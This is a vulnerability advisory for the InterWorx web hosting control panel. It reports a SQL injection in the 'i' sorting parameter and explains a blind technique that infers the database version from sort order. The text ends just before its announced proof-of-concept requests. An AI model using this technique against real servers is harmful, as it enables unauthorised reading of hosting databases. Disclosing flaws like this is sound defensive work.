About the Vendor:
-------------------------
The InterWorx Hosting Control Panel is a web hosting and linux server
management system that provides tools for server administrators to
command their servers and for end users to oversee the operations of
their website.

Advisory Details:
-----------------------
SQL injection vulnerability in the InterWorx Web Control Panel.

The InterWorx application stores its data in a MySQL-database. For
interaction with the database dynamic queries are used. These queries
are created by concatenating strings from the application with user
input. However, the application does not perform proper validation or
escaping of the supplied input in the 'i' parameter when sorting user
accounts in NodeWorx, Siteworx and Resellers. Malicious users with
access to this functionality can manipulate database queries to
achieve other goals than the developers had in mind.

The following requests can be used as proof of concept and demonstrate
that user input is concatenated into a database query without proper
validation or escaping. The payload in the first request checks
whether the letter 'm' is the first letter of the database version.
Since the database in use is MySQL this condition is true and the
table is sorted by column 'nu.email'. If the condition is false
(request 2/letter t) the table is sorted by column 'nu.nickname'.
